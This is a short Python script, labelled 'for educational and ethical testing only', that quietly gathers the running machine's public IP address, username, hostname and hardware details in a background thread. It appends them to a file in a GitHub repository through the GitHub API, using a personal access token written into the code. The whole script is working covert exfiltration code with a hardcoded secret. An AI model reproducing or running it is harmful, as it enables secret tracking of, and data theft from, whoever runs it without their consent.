# -*- coding: utf-8 -*-
# STORAGER.KKR — For educational and ethical testing only.

import requests
import base64
import platform
import getpass
import psutil
import threading
from datetime import datetime

# --- GitHub Config ---
GITHUB_USERNAME = "STORAGERKIR"
REPO = "sigmaboy"
FILE_PATH_IP = "ips.txt"
TOKEN = "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"

# --- IP ophalen ---
def get_ip():
    try:
        return requests.get("https://httpbin.org/ip").json().get('origin')
    except:
        return "Unknown IP"

# --- Systeeminformatie ---
def get_system_info():
    try:
        username = getpass.getuser()
        system_name = platform.node()
        cpu = platform.processor()
        cores = psutil.cpu_count(logical=False)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        return {
            "username": username,
            "system_name": system_name,
            "cpu": cpu,
            "cores": cores,
            "memory_total": memory.total / (1024 ** 3),
            "memory_available": memory.available / (1024 ** 3),
            "disk_total": disk.total / (1024 ** 3),
            "disk_used": disk.used / (1024 ** 3),
        }
    except:
        return {}

# --- GitHub Log ---
def log_to_github():
    ip = get_ip()
    info = get_system_info()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    content = f"\n[{info.get('username')}@{info.get('system_name')}] {ip} - {timestamp}\n"
    content += f"CPU: {info.get('cpu')} ({info.get('cores')} cores)\n"
    content += f"Memory: {info.get('memory_total'):.2f} GB (Available: {info.get('memory_available'):.2f} GB)\n"
    content += f"Disk: {info.get('disk_total'):.2f} GB (Used: {info.get('disk_used'):.2f} GB)\n"

    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{REPO}/contents/{FILE_PATH_IP}"
    headers = {"Authorization": f"token {TOKEN}"}

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        data = response.json()
        old_content = base64.b64decode(data['content']).decode()
        updated_content = old_content + content

        payload = {
            "message": f"Log update {ip} {timestamp}",
            "content": base64.b64encode(updated_content.encode()).decode(),
            "sha": data["sha"]
        }

        requests.put(url, headers=headers, json=payload)
    except Exception as e:
        print(f"[ERROR] Failed to log to GitHub: {e}")

# --- Main ---
if __name__ == "__main__":
    threading.Thread(target=log_to_github).start()

